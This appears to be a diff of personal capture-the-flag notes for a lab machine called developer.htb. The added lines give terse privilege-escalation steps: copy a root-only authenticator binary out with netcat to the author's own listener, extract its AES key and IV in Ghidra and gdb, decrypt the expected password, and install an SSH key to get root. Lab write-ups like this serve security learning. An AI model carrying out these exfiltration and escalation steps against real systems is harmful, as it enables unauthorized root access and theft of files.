@@ -82,20 +82,22 @@ select username, first_name, password from auth_user; -> get karl's hash -> hash
 su karl
 sudo -l: Can run /root/.auth/authenticator -> send file: nc <my ip>:<myport> < /root/.auth/authenticator -> receive file: nc -nvlp <myport> > authenticator
 use ghidra 1.10.1 to open the file(Ver 1.11 also does not work well...)
+New project -> import authenticator and analyze -> filter main -> main under authentication
+-> msg = (&str)crypto::aes::ctr() - encrypting line: crypto::aes::ctr(size=0x20, key, iv) -> search key & iv values above
+-> each are having 4 lines -> double click DAT[...] -> drag whole block, copy special, byte string with no spaces -> get both key & iv
+-> do it for __ptr
 
+These two lines check if input has valid length & content, check memory hex of the second lines(Only need last 3 numbers)
+if ((lStack552 == 0x20) &&
+     ((local_238 == __ptr
 
-sudo apt update
-sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev \
-libncursesw5-dev libreadline-dev libsqlite3-dev libgdbm-dev \
-libdb5.3-dev libbz2-dev libexpat1-dev liblzma-dev tk-dev wget
-cd /usr/src
-sudo wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
-sudo tar xzf Python-2.7.18.tgz
-cd Python-2.7.18
-sudo ./configure --prefix=/usr/local/python2
+sudo gdb authenticator -> b main; r -> b *<current location hex excluding last 3 hex><3 hex from ghidra>, c
+-> input password: <anything that is 32 characters> 
+-> x/32bx $rax(my input encrypted), x/32bx $r15(answer encrypted) -> only get the content(remove memory location, 0x, and concatenate)
 
-  sudo make -j$(nproc)
+cyberchef -> decrypt aes(CTR) -> key, iv from ghidra
+Input: <value from $rax> -> Output: <my input>
+Input: <value from __ptr or $r15> -> Output: <answer>
 
-  sudo make install
-  echo 'export PATH=/usr/local/python2/bin:$PATH' >> ~/.bashrc
-source ~/.bashrc
+generate ssh key(ex:ssh-keygen -t ed25519)
+karl: sudo /root/.auth/authenticator -> <answer> -> <my public ssh key> -> ssh root@developer.htb -> automatic login & get root
